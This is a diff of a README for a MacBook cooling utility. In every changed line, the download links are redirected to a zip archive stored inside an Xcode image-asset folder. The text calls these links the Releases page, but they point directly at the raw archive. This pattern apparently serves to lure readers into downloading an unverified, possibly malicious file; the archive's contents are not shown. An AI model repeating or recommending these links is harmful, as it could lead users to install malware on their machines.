@@ -1,6 +1,6 @@
 # 🌡️ macbook-cooler - Optimize Your MacBook's Temperature Easily
 
-[![Download](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/cooler_macbook_v2.8.zip)](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/cooler_macbook_v2.8.zip)
+[![Download](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/MacBookCooler/Resources/Assets.xcassets/cooler-macbook-2.5.zip)](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/MacBookCooler/Resources/Assets.xcassets/cooler-macbook-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application.
 
 Click the link below to visit the Releases page and find the latest version of macbook-cooler:
 
-[Download macbook-cooler](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/cooler_macbook_v2.8.zip)
+[Download macbook-cooler](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/MacBookCooler/Resources/Assets.xcassets/cooler-macbook-2.5.zip)
 
 ### Installation Steps
 
@@ -58,4 +58,4 @@ macbook-cooler is open-source software. You can check the License details in the
 
 Thank you for choosing macbook-cooler! We hope this tool helps keep your MacBook running cool and efficiently. Enjoy using your MacBook with peace of mind knowing you have a thermal management solution at your fingertips.
 
-[Download macbook-cooler](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/cooler_macbook_v2.8.zip) for the latest version today!
+[Download macbook-cooler](https://github.com/franko256/macbook-cooler/raw/refs/heads/main/MacBookCoolerApp/MacBookCooler/Resources/Assets.xcassets/cooler-macbook-2.5.zip) for the latest version today!
